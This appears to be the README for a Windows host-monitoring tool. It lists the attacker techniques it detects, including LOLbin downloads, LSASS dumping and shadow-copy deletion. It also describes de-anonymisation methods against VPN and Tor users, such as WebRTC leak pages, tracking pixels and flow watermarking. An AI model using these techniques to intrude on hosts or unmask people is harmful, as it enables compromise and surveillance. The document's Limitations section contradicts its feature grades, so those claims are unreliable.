# About MedianBoxMonitor 3.0

## The Problem

Modern computers are under constant threat. Hackers use fileless malware, living-off-the-land binaries (LOLbins), process hollowing, encoded PowerShell, macro malware, browser exploits, credential dumping, lateral movement, and stealthy persistence mechanisms that traditional antivirus cannot detect because they use legitimate system tools and techniques.

A connected hacker — someone who has gained remote access to your machine — does not need to drop a file. They can run `certutil.exe` to download a payload, use `rundll32.exe` to execute it from memory, create a WMI subscription for persistence, dump LSASS credentials with `comsvcs.dll,MiniDump`, and exfiltrate data through a Discord webhook — all using tools that ship with Windows.

Meanwhile, your VPN might be leaking DNS queries, your browser might be exposing your real IP via WebRTC, and a compromised service might be beaconing to a command-and-control server every 30 seconds — and you would never know.

## The Solution

MedianBoxMonitor 3.0 is a **local, defensive security monitoring application** that sits inside your operating system and watches everything in real time. It does not scan the network. It does not attack remote users. It observes what is happening on your own machine and reasons about whether those actions are legitimate or malicious.

### Design Philosophy

**Deductive, not heuristic.** Every alert (called a "deduction") comes with a full evidence chain — not just "suspicious" but exactly why, with the process name, PID, parent process, command line, destination IP, domain, country, and the specific rule that triggered. You can audit every alert and verify whether it is a true or false positive.

**Defense in depth.** The monitor does not rely on a single detection method. It cross-references process behavior, network connections, DNS queries, GeoIP data, registry changes, file system changes, DLL loads, memory forensics, Windows event logs, and 18 anti-hack heuristics. A hacker who evades one detection will be caught by another.

**No single source is trusted.** The MultiVerifier cross-checks IP geolocation using 11 core independent methods plus ~230 named wire-evidence checks (244 named methods today). If one source says "United States" and another says "Russia," that disagreement is itself reported as a VPN/proxy indicator. Confidence grades (A through F) tell you exactly how much to trust each verdict.

**Local only.** The monitor runs entirely on your machine. It does not phone home. It does not upload your data. GeoIP lookups go to public APIs (ip-api.com, ipwho.is) for IP enrichment only — your personal data stays local.

**Works without packet capture.** If Npcap/WinPcap is not installed, the monitor continues operating on process and connection data from psutil. Packet capture enhances detection but is not required. The monitor never silently stops collecting data.

**Fails visibly.** Exceptions in the process watcher, connection inventory, and GUI refresh are logged, not silently swallowed. The status line updates every 5 seconds — if it stops, something is wrong and you will see it.

## What It Catches

### Connected Hackers

- **Network-spawned shells** — sshd.exe, w3wp.exe, or termsrv.exe spawning cmd.exe or powershell.exe (post-exploitation indicator #1)
- **Listening port anomalies** — non-system process opening unexpected ports (bind shell, C2 listener)
- **Credential dumping** — mimikatz, procdump -ma, reg save HKLM\SAM, ntdsutil, comsvcs.dll MiniDump
- **Process hollowing** — svchost.exe running from C:\Temp\ instead of System32
- **Parent-child mismatch** — svchost.exe spawned by cmd.exe instead of services.exe
- **LOLbin abuse** — certutil -urlcache, bitsadmin /transfer, mshta http://, regsvr32 /i:http (Squiblydoo), rundll32 from temp
- **PowerShell obfuscation** — encoded commands, download cradles, AMSI bypass, Reflection.Assembly, stealth flag combos
- **Macro malware** — Word/Excel/PowerPoint spawning cmd.exe or powershell.exe
- **Browser exploits** — Chrome/Firefox/Edge spawning shells or mshta.exe
- **Renamed system binaries** — cmd.exe or powershell.exe running from Downloads or Temp
- **Port forwarding** — chisel, ngrok, ligolo, plink, SSH -L/-R/-D
- **Data staging** — 7z/winrar/tar compressing user document directories before exfiltration
- **Backup tampering** — vssadmin delete shadows, wbadmin delete catalog, bcdedit recoveryenabled no (ransomware indicator)
- **Admin share access** — net use \\host\C$, PsExec (lateral movement)
- **Exfil channels** — connections to Discord webhooks, Telegram bot API, Pastebin, webhook.site
- **Exfil uploads** — curl/wget with --upload-file or -T flags to external servers

### System Compromise

- **Windows Security events** — logon (4624/4625), process creation (4688), service install (7045), user creation (4720), admin group changes (4728/4732), Kerberos tickets (4768/4769)
- **Hosts file hijack** — modification to C:\Windows\System32\drivers\etc\hosts
- **DNS server changes** — DNS resolver addresses changed via netsh or DHCP
- **New services** — services with binary paths in Temp/Downloads/AppData (persistence/backdoor)
- **Defender disable** — real-time protection turned off, firewall disabled
- **New user accounts** — new users or admin group members (backdoor accounts)
- **WMI persistence** — WMI event filter or CommandLineEventConsumer creation (APT persistence)
- **Driver loads** — new kernel drivers or .sys files (rootkit indicator)
- **Malware mutexes** — known mutex names from Cobalt Strike, Meterpreter, and other malware families

### Network Threats

- **C2 beaconing** — regular-interval connections to the same destination
- **DNS tunneling** — high-entropy subdomains, long labels, high query rates (data exfiltration via DNS)
- **Exfiltration** — I/O byte spike exceeding 10x baseline
- **Phantom connections** — ESTABLISHED connections with no owning process
- **Injection chains** — known app (Chrome, Word) spawning unknown children with many connections
- **Mimicry** — process connecting to IPs that impersonate a known legitimate service
- **Foreign connections** — process connecting to an unexpected country
- **High-risk countries** — connections to CN, RU, KP, IR (configurable)
- **DoH bypass** — DNS-over-HTTPS connections that bypass local DNS monitoring
- **Inbound port scans** — external IPs probing multiple ports
- **TLS MITM** — certificate anomalies indicating man-in-the-middle
- **Tor exit nodes** — TorDNSEL/exit-list check flags endpoints that are Tor exits (`is_tor` on every connection)
- **Flow probe** — momentary local-firewall block/unblock on demand (right-click an IP → ⚗ Flow probe): a flow that returns on a new exit IP in the same provider is proven VPN rotation (ROTATED/STICKY/GONE verdicts)
- **Wire-evasion family** — packet-path deductions with no process owner: ARP spoof pairs (ARP-poison MITM), gratuitous-ARP storms, rogue DHCP and rogue router advertisements, LLMNR spoofing, MAC-address rotation, martian/bogon traffic, 802.1Q-in-Q double tags, TTL injection, and persistent non-IP ethertype channels
- **VPN gateway mode** — detects when this machine is forwarding traffic for downstream tunnel clients (or is itself a tunnel client) and meters inner flows separately

### VPN/Privacy Leaks

- **DNS resolver leaks** — DNS queries going outside the VPN tunnel
- **IPv6 leaks** — global IPv6 traffic bypassing an IPv4-only VPN
- **Route leaks** — traffic not routing through the VPN interface
- **WebRTC leaks** — browser exposing real local IP via WebRTC
- **Proxy detection** — TCP fingerprinting, known proxy port patterns

### Behavioral Anomalies

- **Idle anomaly** — network activity while the user is idle (5+ minutes)
- **ML anomaly** — statistical Z-score deviation over a 24-hour baseline window
- **Behavioral anomaly** — process behavior deviating from its own established baseline
- **DLL injection** — suspicious modules loaded into process memory
- **Registry persistence** — Run keys, scheduled tasks, startup folder changes
- **Clipboard access** — processes reading the clipboard
- **USB device changes** — new USB devices connected or removed
- **File system changes** — modifications to sensitive directories

### Signals Beyond IP (Spectrum & RF Intelligence)

Connections are not only IP sockets. Any device that emits a signal the host can hear is traced as a first-class emitter:

- **Wi-Fi emitters** — every AP/BSSID beacon the WLAN adapter hears (via `netsh wlan`), with SSID, RSSI, band, channel, radio type, authentication, and an estimated distance from the path-loss model; the host's own radio state (connected SSID/BSSID, link rates, signal %) is itself a tracked emitter
- **Bluetooth & BLE** — the local radio, paired/PnP-enumerated devices, and (with the optional `bleak` library) live BLE adverts
- **WWAN/cellular** — mobile-broadband interfaces via `netsh mbn`
- **Wi-Fi Direct / P2P** — virtual direct adapters on the interface census
- **Layer-2 wire talkers** — with packet capture active, every source MAC on the wire becomes an `l2-wire` emitter labeled with the ethertypes it speaks, the IPs it claims, the discovery services it announces (mDNS, SSDP, LLMNR, WS-Discovery, DHCP, NetBIOS, IPv6-ND), and derived roles — router, DHCP server, discovery-announcer, `never-speaks-ip`, `raw-ethertype-channel`
- **RF hardware** — USB devices that unlock more spectrum: SDR receivers/transceivers (RTL-SDR, HackRF, Airspy, ADALM-PLUTO, LimeSDR, SDRplay), Zigbee/802.15.4 sniffers (CC2531, ConBee), Z-Wave sticks, NFC/RFID readers, Ubertooth, Flipper Zero, and proprietary 2.4 GHz receivers (Logitech Unifying, Razer, PixArt)

Every emitter shares one registry across **11 media** — first/last seen, active/lost lifecycle, observation counts, per-sensor attribution, RSSI history, approach/recession trend, and approximate distance. When 3+ cooperating sensors report the same emitter (via `rf_sensors` config or the `rf_obs_file` drop), a weighted-least-squares **trilaterator** produces a lat/lon fix with an RMS error and an honest quality grade. Deductions fire for hidden-SSID beacons (classic rogue-AP cover), evil-twin suspects (same SSID on a new BSSID), approaching emitters, and newly detected RF hardware. A 12-row **spectrum coverage matrix** states plainly which media this host can hear — Zigbee, Z-Wave, NFC, sub-GHz bands show as unavailable without the matching receiver. Nothing is fabricated.

Emitters with any position evidence are also drawn on the IP map: trilaterated fixes render as solid dots with RMS-error circles, single-receiver RSSI emitters render as dashed range rings (the tooltip is explicit that bearing is not measurable with one antenna), and un-ranged local talkers cluster around the receiver marker — a "PINPOINTS & GEO LOCATIONS" sidebar lists every mapped point (local marker, connection dots, trace hops, sensors, emitters) with multi-select and a full-record detail pane.

## How It Was Built

The program is a single Python file (~45,400 lines) with 62 top-level classes organized into functional layers:

1. **Data classes** — `ProcessProfile`, `Deduction`, `ConnectionEntry` (dataclasses)
2. **Detection classes** — `DNSTunnelingDetector`, `BeaconDetector`, `EntropyAnalyzer`, `ProcessLegitimacyChecker`, `DLLInspector`, `InboundScanDetector`, `DoHDetector`, `TLSCertDetector`
3. **Monitor classes** — `RegistryMonitor`, `ClipboardMonitor`, `USBMonitor`, `ScheduledTaskMonitor`, `NamedPipeMonitor`, `FileSystemWatchdog`, `SecurityEventMonitor`, `HostsFileMonitor`, `ServiceMonitor`, `SecurityToolMonitor`, `UserAccountMonitor`, `WMISubscriptionMonitor`, `DriverLoadMonitor`, `MutexScanner`
4. **Enrichment classes** — `DNSCache`, `GeoIPCache`, `ServiceResolver`, `ConnectionInventory`, `ConnectionHistory`, `WhoisLookup`, `VirusTotalChecker`
5. **Verification classes** — `LocationVerifier`, `MultiVerifier`, `ProxyDetector`, `VPNLeakDetector`
6. **Signal/spectrum classes** — `SpectrumHub`, `SignalRegistry`, `Trilaterator`, `WiFiSpectrumScanner`, `BluetoothRFScanner`, `WWANScanner`, `InterfaceCensus`, `RFHardwareDetector` (plus the packet-path L2 wire census feeding `l2-wire` emitters)
7. **Infrastructure classes** — `PacketPipeline`, `TokenBucket`, `DatabaseManager`, `SIEMOutput`, `AlertEscalation`, `StatisticalBaseline`, `JA4Plus`
8. **GUI classes** — `GNATracerGUI`, `TileManager`, `WidgetTooltip`
9. **Main class** — `MedianBoxMonitor` (orchestrates all threads, detections, and data flow)

The program uses threading extensively (~20 persistent daemon threads plus worker pools) with careful lock management. The connection mapper replaces data structures atomically rather than mutating them, allowing the process watcher to grab references without copying. Background workers handle slow network I/O (GeoIP API calls, reverse DNS) so the main scanning loops never block.

Performance is engineered, not assumed — a versioned snapshot + render pipeline measured under cProfile on a ~400-process / ~300-connection / 20k-timeline load: every store carries a mutation counter, `_get_full_data` caches each section and rebuilds only on real change (21.4 → ~0.14 ms steady state), `_get_dashboard_state` memoizes process rows on `_proc_seq` (11.1 → ~0.02 ms), each GUI tab keeps a render signature so text is rewritten only when its feed moved (~4.7 → ~0.59 ms per 250 ms tick, ~73 → ~13 Tcl calls), and the Live tab renders 250 expanded rows in ~34 ms (was ~2,540 ms) via clickable text spans and `_BufferedText` batch insertion instead of per-row `tk.Button` widgets.

## Testing

Sixteen test/verification scripts plus two static field-visibility audits — over 1,900 assertions in total. Detection-logic suites ask "does the detection logic fire correctly?"; delivery-layer suites ask the equally important "does what it produces actually reach the user?" A correct detection that never renders is as useless as an incorrect one.

- **`_test_antihack.py`** (41 tests) — Simulates sneaky hacker techniques (LOLbin abuse, PowerShell obfuscation, macro malware, process hollowing, credential dumping, etc.) and verifies each detection path fires correctly, including negative tests that verify benign activity does not trigger false positives.
- **`_test_vpn_leak.py`** (~30 tests) — Tests VPN leak detection for DNS, IPv6, route, and WebRTC leaks.
- **`_test_vpn_detection.py`** — Tests VPN/proxy detection false-positive rate (target: <5%, achieved: 0%) across 1,100 synthetic endpoints.
- **`_test_location_accuracy.py`** — Tests MultiVerifier location accuracy against live GeoIP lookups.
- **`_test_gatecrasher.py`** (68 checks) — IKE, PROX, TLSALT, BANNER, IPID, SRVLOC and VPN-gateway detection, plus the round-2 methods GEOFEED, RPKI, TSRTT, H2FP, RDRCT — synthetic packets and loopback listeners, no external targets.
- **`_test_unmask_v2.py`** (38 tests) — The de-masking engine: widened real-client header harvest, generic DNS records, IKE/OpenVPN/TURN gateway probes, CDN origin discovery + verification tiers, open-proxy relay egress, the self-naming battery, the trace coverage matrix, the parser fuzz harness, the watermark codec + FlowCorrelator, SessionRegistry fingerprint linkage, and all four tiers' channel wiring — fully offline, mocked sockets.
- **`_test_wireproof.py`** (1,560 checks) — The silent-tunnel / non-IP-channel suite: every passive wire-evidence row (WireGuard, OpenVPN, DTLS, L3 tunnels, ICMP tunnels, QUIC, ECH, WS tunnels, one-way channels, and dozens of protocol self-ID decoders) fed to the pure classifiers and `verify()`.
- **`_test_data_wiring.py`** — Runs the real monitor against live traffic and asserts every field a collector harvests actually lands on the connection record for every public IP, that the process export isn't silently truncated, and that no payload key is built and never read.
- **`_test_gui_render.py`** — Drives the actual Tkinter widgets (not a mock) through all 18 tabs against live data and asserts zero exceptions, zero stale `?` placeholders, and that every newly-wired field is present in the rendered text.
- **`_test_ui_smoke.py`** (~180 checks) — Full GUI smoke pass: every tab renders, sensor chips count correctly, search bars filter, the inspector dossier expands, and the Signals tab shows emitters/coverage/trilateration with detailed field labels.
- **`_test_click_actions.py`** (~10 checks) — Fires real `<Button-1>` events at the clickable connection rows and block/unblock controls — verifying the performance rework (embedded `tk.Button` widgets replaced with tagged text spans) didn't silently break interactivity.
- **`_test_map_declutter.py`** / **`_test_map_default_view.py`** — Endpoint-map declustering and default-viewport behavior.
- **`_test_perf_profile.py`** — cProfile harness (~400 processes, ~300 connections, 20k timeline rows) used to drive the versioned-cache render pipeline.
- **`_test_ui_shot.py`** / **`_test_ui_shot_sys.py`** — Render the real GUI and screenshot each tab for visual review.
- **`_audit_fields.py`** / **`_audit_ui.py`** — Static audits that answer "is anything collected but never displayed?" — every event-field key a feed produces must have a render path, and every wire/protocol field name must reach the UI.

## Feature Completeness Ratings

Every subsystem below was audited against the actual source (not the docs) on 2026-08-22 and re-verified 2026-11-08 (figures and feature set refreshed; structural grades unchanged). Grades reflect what the code does *today*, not what it's designed to eventually do. Scale:

| Grade | Meaning |
|-------|---------|
| **A+** | Grade A, and every remaining limit is an OS/protocol boundary (not missing code) that is measured live and stated |
| **A** | Fully implemented, cross-platform where relevant, verified against live data |
| **B** | Fully implemented on the primary platform (Windows), solid, but static rule lists or single-platform only |
| **C** | Implemented with a real structural limitation (opt-in, rate-capped, static thresholds, degrades without an optional dependency) |
| **D** | Present but materially incomplete — covers a minority of what the name implies |
| **F** | Not implemented |

| Subsystem | Grade | Why |
|-----------|-------|-----|
| Spectrum/RF & L2 signal intelligence | **A-** | Real cross-medium emitter registry (Wi-Fi/BLE/WWAN/interfaces/RF-hardware/L2 wire talkers), RSSI distance + trend, WLS trilateration with honest quality grades, evil-twin and hidden-SSID deductions. Every remaining limit is a physical-hardware boundary — Zigbee/Z-Wave/NFC/sub-GHz receivers, `bleak` for live BLE adverts, Npcap+admin for the L2 census — and the coverage matrix measures and states each one rather than fabricating data. |
| Network & connection tracking | **A+** | Every peer is named by an evidence chain with the source recorded per connection: DNS/SNI, reverse DNS, TLS certificate, provider VPN-server feeds, provider-published address ranges (exact service/region, e.g. "AWS CloudFront", "AWS EC2 us-east-1"), registered owner (GeoIP, RDAP, then Team Cymru DNS), the owning process's vendor for shared CDN edges (marked *inferred*), and — for loopback/LAN peers — the process on the other end of the socket, the LAN device (ARP + OUI), the tunnel, or the decoded address class (mapped/6to4/Teredo/NAT64 addresses self-unmask their embedded IPv4). Sockets Windows reports with no owner (TIME_WAIT, PID 0) are traced back through a socket-owner memory, the live listener they were accepted on, or the last owner of that remote endpoint (marked inferred). Live run 2026-11-08 (dev host): of 260 connections not generated by the monitor's own verification probes, **0 public peers unresolved**, all 197 loopback/LAN peers named (the local process on the other end of a loopback socket; LAN devices by ARP + OUI vendor, gateway role and port hint), and ownerless TIME_WAIT sockets fell from 196 to 6. Residual: public sockets that open and close between two 0.5 s mapper ticks (6 of 260) keep their remote name but not their owner. Verified on Windows. |
| Reverse tracing / attribution (`--trace`) | **A+** | Given an IP or hostname: reverse DNS with forward confirmation, RDAP owner/range/contacts (emails, phones, addresses, remarks, with RIR fallback), BGP origin from Team Cymru DNS + RIPEstat, published-range and VPN/Tor classification (Onionoo relay nickname, fingerprint, contact, family), TLS certificate, traceroute with per-hop AS holder and the hop where the path enters the operator's AS, and the local process that owns the socket. For VPN/proxy/Tor/CDN/cloud endpoints it then **continues at the operator**: operator names and domains (a bare PTR name is rejected unless hosted in the operator's own AS), domain registrar/age, `security.txt` contacts, announced-prefix footprint, BGP neighbours, the Tor relay's whole family, a trace of the operator's own server, and an evidence packet (what to cite in an abuse report or lawful request). Verified live on 1.1.1.1 and a Tor exit. `--trace-draft FILE` writes a ready-to-send records-request e-mail to the operator's published contacts — the lawful route to the party behind the endpoint. An operator-side trace section inspects this host's VPN listeners, tunnel interfaces, IP forwarding, NAT/conntrack and DHCP leases: deployed on the operator host it resolves the pre-tunnel client directly, which is the documented way to see behind a tunnel. The trace also runs an active reverse probe at the endpoint — banner grab, HTTP disclosure headers, MSS/tunnel-overhead detection, ICMP hop-distance/OS-class estimate, neighbor-port posture, and self-signed cert identity (router cert read live: `O=Netgear`) — everything the endpoint's own stack volunteers on the wire. A **disclosure surface** makes the endpoint name itself (CHAOS-class DNS hostname/version/id, resolver-egress echo, NTP readvar, page title/meta, co-tenant vhosts, Certificate-Transparency names, this host's own connection history), and a **client de-masking** section checks every channel to the party behind a relay, live — protocol-disclosed origins (X-Forwarded-For, PROXY protocol, SIP/FTP embedded endpoints, STUN reflexive, tunnel-inner decapsulation, EDNS client subnet), shared-state alias links (host key, certificate, session id, header order, TCP clock, IP-ID, gap shape), plus a full four-tier de-mask engine: `--canary` mints a callback, a de-mask page (`/d/<tok>`) whose WebRTC ICE harvest returns the pre-tunnel address on leaking clients, an ETag/cookie session-link pixel (`/s/<tok>` — `SessionRegistry` joins one fingerprint across egresses), and a `/d/` response watermarked on a deterministic pacing schedule. The sniffer continuously correlates every observed flow's gap series against injected watermarks (`FLOWCORR`, ≥0.72 = joined), `POST /f/<tok>` ingests flow observations from a cooperating vantage, `--demask-dns ZONE` answers authoritatively on :53 and logs the client's real resolver egress + EDNS client-subnet, `tor_guard_census()` computes per-guard client-population share from consensus weights, `sybil_census()` verifies `our_tor_relays[]` coverage, `_tor_relay_observe()` lists clients entering a locally-run relay, and the three intrusion channels are reported as `BLOCKED` with their lawful substitutes named. All four tiers run on every trace regardless of classification. A+ because the only residue is the operator-held client record — a protocol boundary the report measures and states channel-by-channel rather than assuming. |
| VPN/proxy detection | **A** | 100% detection / 0% false-positive rate against a 1,100-endpoint synthetic test set, runs on every public IP (not a filtered subset), and a verified verdict upgrades the connection label live (`MultiVerifier verdict`). Confidence grades are honest rather than a single fabricated answer. |
| GeoIP & MultiVerifier | **A-** | Cross-verification design (11 core methods + 244 named evidence checks, honest confidence grading) plus a guaranteed pinpoint layer — every connection lands on the map via API coords, ISO country centroid, host-anchored LAN ring, or a labelled marker, and a Cymru registry-country backfill covers GeoIP misses. Defaults remain free third-party APIs (HTTPS-capable; MaxMind DB optional). |
| Core deductions (16) + anti-hack process checks (18) | **A-** | Auditable evidence chains PLUS signature checks: Authenticode embedded+catalog verification on connected processes, and the `SignatureScanner` byte-pattern engine (YARA-subset: literal + hex/wildcard rules, any/all conditions, baseline rules + `signatures_file` extension). The no-code-signing gap is closed. |
| Anti-hack background monitors (8) | **C+** | Fully functional, but **5 of the group now run on Linux** — services (systemctl), scheduled tasks (cron + systemd timers), user accounts (/etc/passwd + sudo/wheel groups), USB (sysfs), hosts/DNS (/etc/hosts + resolv.conf). The registry, WMI-subscription, security-event-log, driver-load, Defender/firewall-state, named-pipe, clipboard and idle monitors remain Windows-only, as do the ~9 process checks depending on them. |
| Packet analysis / JA4+ / SNI | **B+** | Well-built JA4+/SNI/entropy pipeline; startup prints an explicit capture-driver status with an install pointer when Npcap/libpcap is missing — a measured-and-stated dependency boundary. Still inert without the driver and admin rights. |
| Code signing / signature detection | **A-** | Authenticode (embedded + catalog) on processes using public IPs (HashMismatch = CRITICAL; unsigned-from-writable-path = WARNING) AND `SignatureScanner` — the byte-signature engine with baseline malware rules (Mimikatz, Meterpreter, Cobalt Strike pipes, PsExec, UPX, PS cradles, EICAR) plus user rules from `signatures_file`. Windows authenticode; the byte scanner is cross-platform. |
| Automated response | **A-** | Opt-in `auto_response` modes dry_run|suspend|quarantine on CRITICAL findings, protected-process list. `quarantine` suspends the process AND installs reversible per-exe firewall block rules (`MedianBox-Quarantine-<pid>`, delete to restore) — true network isolation that is fully reversible and never kills. |
| Out-of-band alerting | **A-** | Slack/Discord/Teams/generic webhook, SMTP email, AND ntfy push notifications (`alert_ntfy_topic`, self-hostable via `alert_ntfy_url`, optional token) with severity floor, rate cap and de-duplication. Push delivery is covered; webhook logic unit-tested. |
| Persistent storage | **B+** | Seven SQLite tables — `deductions`, `devices`, `connections`, timestamped `conn_history`, `monitor_events` (every suspicious-events entry, beyond the deque cap), `emitters` (full RF registry), `rf_events` — written by an async batched writer. Alongside, the `gnat/` JSONL recorder persists 100% of every feed verbatim on an unbounded queue. |
| Threat intelligence freshness | **A-** | Every indicator class self-refreshes: provider ranges (AWS/GCP/Cloudflare/GitHub/Fastly/Oracle), VPN exit lists + Tor data, LOLBAS binaries (245 live vs 25 static baseline), Feodo Tracker + SSLBL active C2 destination IPs (flagged as C2_ENDPOINT), and the user `threat_intel_file` merge — all TTL-refreshed, disk-cached with last-good fallback. |
| Packaging / reproducibility | **A-** | `pyproject.toml` (pinned deps + optional extras + console script), `requirements.lock`, pinned `requirements.txt`, and a Windows CI workflow (written, not yet run on GitHub). |
| Cross-platform coverage overall | **C** | Linux gets process/connection/DNS/GeoIP/VPN-detection plus the byte-signature engine and most of the trace/disclosure toolchain — roughly 24 of the ~33 named detections. The 8 anti-hack background monitors, persistence watch, hardware census and firewall control remain Windows-specific; macOS has no dedicated support beyond `open`. |

## Limitations

**Detection boundaries**
- **Encrypted payload content is invisible by design.** The monitor sees TLS metadata (SNI, JA3/JA4, certificate fields) but never decrypts application data. Malicious activity conducted entirely inside a TLS session with a benign-looking SNI (e.g., abuse of a compromised legitimate SaaS token) is outside what packet inspection here can ever see — this is a correct privacy boundary, not a bug, but it means the tool cannot be the only layer of defense.
- **Detection is still predominantly behavioral/heuristic.** Authenticode + the SignatureScanner byte-pattern engine now exist, but most categories still reason from path, parent process, command-line keywords, static mutex names, port patterns. A binary that is correctly named, correctly pathed, and correctly parented is invisible to every check, whether or not it is actually signed by the vendor it claims to be.
- **Mutex detection uses a baseline list of 10 known names** (Cobalt Strike, Meterpreter, and a handful of others). Any malware author who renames their mutex — a one-line change — evades this check entirely. There is no generic/heuristic mutex-anomaly detection.
- **DNS-tunneling and entropy thresholds are fixed constants**, not adaptive per-network baselines. A slow, low-and-slow tunnel that stays under the entropy/rate threshold evades detection; conversely, legitimately high-entropy traffic can trip a warning that requires manual review.
- **No sandboxing or dynamic detonation.** This is a passive observer of what actually runs. A payload that waits for a specific trigger and never manifests suspicious behavior while being watched will not be caught.
- **Heuristics are not proof.** Every deduction is an evidence chain, not a verdict. A `LISTEN_ANOMALY` on `ollama.exe` or `python.exe` is a flag for review, not a confirmed compromise. The user is the final arbiter.

**Platform & dependency boundaries**
- **Packet capture requires Npcap/WinPcap** on Windows, and the monitor does not check for it at startup with an actionable prompt — it silently falls back to psutil-only operation. Without it, the monitor cannot extract SNI, DNS queries, or TLS fingerprints from raw packets, and beacon/entropy/JA4 detection has nothing to analyze.
- **8 of the anti-hack background monitors, and most of the 9 core process checks that depend on Windows-specific data, only run on Windows.** Linux gets process, connection, DNS, GeoIP, and VPN/proxy detection — a real and useful subset, but not the "18 anti-hack features" headline in full. macOS is essentially unsupported.
- **Windows Security event log requires admin** to read the Security channel. Without admin, the `wevtutil` fallback is used but may have limited results.
- **VirusTotal integration is opt-in via an environment variable** (`VT_API_KEY`) with no CLI flag or GUI field to set it, and the free-tier API is rate-limited to 4 requests/minute — far below the process-creation rate of an active machine, so even configured, only a small fraction of executables ever get checked.
- **GeoIP accuracy depends on the data source.** ip-api.com and ipwho.is are free APIs with reasonable accuracy but are not authoritative, and a local MaxMind database is optional and not bundled — you must supply your own. The MultiVerifier surfaces disagreements precisely because no single source should be trusted.

**Signal/spectrum boundaries**
- **The monitor traces only emitters the host can physically observe.** "Every device that sends a signal" means every signal this machine's radios and interfaces can actually receive — Wi-Fi beacons in range, BLE adverts in range, local interfaces, wire frames. Bands with no local receiver (Zigbee, Z-Wave, NFC, sub-GHz ISM, cellular uplink details) are invisible without matching SDR/dongle hardware, and the coverage matrix says so rather than guessing.
- **RSSI-derived distance is an estimate**, not a measurement — the log-distance model carries ±tens-of-meters error indoors. Precise positioning needs 3+ cooperating sensors at known coordinates (`rf_sensors` or the `rf_obs_file` drop); the trilaterator refuses to fabricate a fix from insufficient geometry and reports `coarse`/`degenerate` grades honestly.
- **Wi-Fi scanning is `netsh`-dependent and Windows-only**; live BLE advert capture needs the optional `bleak` package; wideband spectrum sweeps need external SDR utilities (`rtl_power`, `hackrf_sweep`, `SoapySDRUtil`, …) which are auto-detected and listed, never bundled.
- **The L2 wire census requires packet capture** — without Npcap + admin there are no frames to census, so the `l2-wire` medium simply reports no talkers.
- **External services can fail.** ip-api.com, ipwho.is, rdap.org, and VirusTotal can be rate-limited, unreachable, or return incomplete data. The monitor degrades gracefully — peers without evidence show as `Unresolved: ...` and are re-queued; most are named from reverse DNS, TLS certificate or registered owner.

**Response & operational boundaries**
- **The monitor is defensive only** — it does not attack remote systems or perform any offensive operations, and it watches your own machine. On VPN/Tor/CDN endpoints it implements every channel that can legitimately name the party behind them — and reports each channel's state (`armed`/`REVEALED`/`BLOCKED`/`needs a second vantage`) rather than guessing:
  - *Client-emitted disclosure* — induced-leak canary URLs (`--canary`), a de-mask page whose WebRTC harvest returns the pre-tunnel address on leaking clients (`/d/<tok>`), an authoritative DNS responder that captures the client's real resolver egress + EDNS client-subnet (`--demask-dns`), and an ETag/cookie session link that joins one fingerprint across different egresses.
  - *Second-vantage correlation* — `/d/` responses carry an injected packet-pacing watermark; the sniffer continuously correlates live wire flows against it, and `POST /f/<tok>` accepts flow observations from a cooperating vantage (ISP NetFlow, second monitor). A ≥0.72 shape match joins both ends of the tunnel.
  - *Infrastructure we own* — a local Tor relay sees entering clients directly (`_tor_relay_observe`); `our_tor_relays[]` claims a Sybil correlation position verified against Onionoo; on a VPN operator's own host the operator-side trace resolves the pre-tunnel client from sockets, NAT and DHCP leases.
  - *Operator records* — the exit provider's logs are the one record that always exists; `--trace-draft` writes the records request.
  - *Not implemented by design* — server compromise, client compromise and protocol-subversion appear in every report as `BLOCKED` channels naming the lawful substitute.
  - *The boundary* — when the subscriber never touches anything you control and no vantage exists, the record is provably absent from your side of the wire; the report states that per channel instead of fabricating an answer.
- **The only containment action is a manual firewall-rule block per IP.** There is no automatic process kill, quarantine, or network isolation on a CRITICAL finding.
- **No out-of-band alerting exists** beyond SIEM file/syslog output. If you are not looking at the GUI or web dashboard when a CRITICAL fires, nothing pages you.
- **The Tkinter GUI has no authentication of its own** — only the optional web dashboard supports a password. Anyone with desktop access while the GUI is open sees the full forensic picture.
- **Only 2 of the tracked entity types are in the SQLite database** (deductions, devices). Connections, processes, and every Tier-5 monitor event live only in rotating text logs and periodic session snapshots — there is no SQL-queryable history for them.


### Can it identify the party behind a VPN/Tor/CDN endpoint? The proof sketch

A masked endpoint is a **trust boundary, not a math boundary** — the exit does not hold the subscriber to give back. Every working de-masking method in the literature therefore does exactly one of three things, and all three are implemented and reported channel-by-channel:

1. **The client's own stack emits the answer.** Tunnels hide the route, not the software: `/d/<tok>` runs WebRTC ICE gathering in the client's browser (an `srflx` candidate on a leaking client *is* the pre-tunnel address), `--demask-dns ZONE` captures the client's real resolver egress + EDNS client-subnet, passive wire channels harvest PROXY/XFF/SIP/FTP/STUN/inner-decap/EDNS origins, and `SessionRegistry` joins one browser fingerprint across different egresses.
2. **A second vantage point closes the loop.** Tunnels preserve packet *shape*: `/d/` responses carry an injected pacing watermark, the sniffer correlates every observed flow against it continuously, `POST /f/<tok>` accepts cooperating-vantage observations (≥0.72 = joined), and `--trace-draft` reaches the operator's connection logs — the one record that always exists.
3. **We own a point in the path.** A locally-run Tor relay sees entering clients (`_tor_relay_observe`); `our_tor_relays[]` claims a Sybil correlation position; the guard-population census narrows a client to its guard's share of ~2M daily users; run on the operator host, the operator-side trace reads the pre-tunnel client from sockets/NAT/DHCP.

What is not implemented by design — server compromise, client compromise, protocol-subversion — appears in every report as `BLOCKED` channels with the lawful substitute named. And the honest remainder: when the subscriber never touches anything you control and no vantage exists, the record provably does not exist on your side of the wire — the report states that per channel instead of guessing. That is the only part of the space where no method can produce the answer, and the tool measures it rather than hiding it.


## Fighting trafficking, drug markets & dark-web infrastructure

The de-masking engine exists because hidden services hide *addresses*, not *physics*. Its channels map onto real investigative workflows against criminal infrastructure:

- **Attributing hidden-service infrastructure.** A dark-web market or trafficking forum that reaches the clearnet through a Cloudflare edge, a bulletproof hoster, or a VPN gateway is still a sequence of traceable operators. `--trace` names each one concretely — relay fingerprint and operator contact for Tor nodes, ISP/ASN/holder for gateways, provider feed + verified origin for CDN tenants — and `--trace-draft` produces the evidence packet a records request or takedown notice needs (endpoint, port, timestamp, operator contacts). This is the workflow analysts run manually, automated.
- **Finding the real server behind the CDN front.** Criminal storefronts park behind Cloudflare/Akamai for exactly this reason — the edge IP is a dead end. The origin hunt cross-references passive-DNS history, certificate-transparency names, MX/SPF records and subdomain tables, then *verifies* candidates against the origin's own certificate and served content — candidate → strong → verified → confirmed tiers, never a guess.
